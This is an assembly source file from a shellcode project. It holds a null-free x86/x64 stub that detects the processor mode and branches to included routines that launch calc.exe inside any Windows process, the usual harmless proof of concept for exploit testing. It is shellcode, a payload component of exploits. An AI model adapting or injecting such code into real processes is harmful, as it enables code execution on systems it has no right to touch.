; Copyright (c) 2009-2014, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; and Peter Ferrie <peter.ferrie@gmail.com>
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.

; null-free x86/x64 branching code for calc.exe executing shellcode.
; Works in any x86 or x64 application for Windows 5.0-6.3 all service packs.
BITS 32

global _shellcode                         ; _ is needed because LINKER will add it automatically in 32-bit mode.
_shellcode:

%ifdef CLEAN
    PUSH    EAX
    PUSH    EDX
%endif
%ifdef STACK_ALIGN
%ifdef FUNC
    PUSH    ESP
    POP     EAX
%endif
    AND     SP, 0xFFF0
    PUSH    EAX
%endif
    ; x86                                 ; x64
    XOR     EAX, EAX                      ; --->  XOR   EAX, EAX
    DEC     EAX                           ; \,->  CQO
    CDQ                                   ; /
    JE      w64_exec_calc_shellcode       ; --->  JE    w64_exec_calc_shellcode

; Because EDX is set to 0 in x64 mode, a size optimization is possible in the x64 shellcode.
%define PLATFORM_INDEPENDENT  

; Since EAX gets decremented on x86, the code did not branch but falls through
; into the x86 shellcode.
w32_exec_calc_shellcode:
%include "w32-exec-calc-shellcode.asm"

; Since EAX does NOT get decremented on x64, the code did branch to the x64
; shellcode.
w64_exec_calc_shellcode:
%include "w64-exec-calc-shellcode.asm"
